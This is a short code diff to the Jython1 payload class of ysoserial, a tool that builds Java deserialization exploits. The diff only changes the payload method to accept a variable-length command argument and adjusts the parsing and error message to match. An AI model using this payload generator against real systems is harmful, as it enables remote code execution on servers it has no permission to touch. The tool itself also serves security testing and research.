@@ -45,11 +45,11 @@ import ysoserial.payloads.util.PayloadRunner;
 @Authors({ Authors.PWNTESTER, Authors.CSCHNEIDER4711 })
 public class Jython1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
 
-    public PriorityQueue getObject(String command) throws Exception {
+    public PriorityQueue getObject(String ... command) throws Exception {
 
-        String[] paths = command.split(";");
+        String[] paths = command[0].split(";");
         if (paths.length != 2) {
-            throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(paths));
+            throw new IllegalArgumentException("Unsupported command " + command[0] + " " + Arrays.toString(paths));
         }
 
         // Set payload parameters
